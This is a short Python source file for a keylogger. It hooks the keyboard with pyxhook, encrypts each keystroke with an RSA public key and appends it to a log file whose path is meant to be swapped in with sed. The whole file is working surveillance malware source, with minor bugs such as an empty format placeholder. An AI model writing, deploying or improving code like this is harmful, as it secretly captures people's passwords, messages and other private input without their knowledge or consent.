#!/usr/bin/env python
import os, sys
import pyxhook
from Crypto.PublicKey import RSA

# This tells the keylogger where the log file will go.
# You can set the file path as an environment variable ('pylogger_file'),
# or use the default ~/Desktop/file.log
log_file = os.environ.get(
    'pylogger_file',
    os.path.join(os.path.dirname(os.path.realpath(sys.argv[0])), 'log') #replaced with a string literal using sed
)

print("logging keystrokes to ".format(log_file))

with open('keys/key.pub', 'r') as f:
    public_key = RSA.importKey(f.read())

def OnKeyPress(event):
    with open(log_file, 'a') as f:
        f.write(public_key.encrypt('{}\n'.format(event.Key), "")[0])

hook = pyxhook.HookManager()
hook.KeyDown = OnKeyPress
hook.HookKeyboard()

try:
    hook.start()
except KeyboardInterrupt:
    # User cancelled from command line.
    pass
except Exception as ex:
    # Write exceptions to the log file, for analysis later.
    msg = 'Error while catching events:\n  {}'.format(ex)
    pyxhook.print_err(msg)
    with open(log_file, 'a') as f:
        f.write('\n{}'.format(msg))
